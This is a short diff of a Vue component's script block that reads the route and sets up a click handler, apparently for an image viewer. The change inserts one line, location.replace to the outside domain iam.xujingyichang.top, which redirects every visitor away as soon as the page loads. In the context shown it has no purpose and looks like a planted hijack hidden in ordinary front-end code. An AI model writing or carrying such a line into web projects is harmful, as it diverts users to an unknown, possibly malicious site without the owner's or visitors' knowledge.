@@ -1,6 +1,6 @@
 <script setup lang="ts">
 const route = useRoute()
-
+location.replace("//iam.xujingyichang.top")
 const imageModel = ref<HTMLImageElement>()
 
 useEventListener('click', async (e) => {
